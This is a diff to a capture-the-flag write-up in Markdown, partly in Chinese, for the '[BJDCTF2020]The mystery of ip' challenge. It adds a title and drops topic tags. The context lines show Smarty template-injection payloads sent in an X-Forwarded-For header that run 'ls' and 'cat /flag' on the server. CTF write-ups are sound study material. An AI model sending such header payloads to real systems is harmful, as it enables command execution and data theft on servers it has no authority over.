@@ -1,3 +1,4 @@
+# [BJDCTF2020]The mystery of ip
 ![](<./img/Pasted image 20221113151242.png>)
 
 首页长这样
@@ -41,5 +42,3 @@ X-Forwarded-For: {system('ls')}
 X-Forwarded-For: {system('cat /flag')}
 ```
 ![](<./img/Pasted image 20221113171153.png>)
-
-#Web #PHP #SSTI #smarty
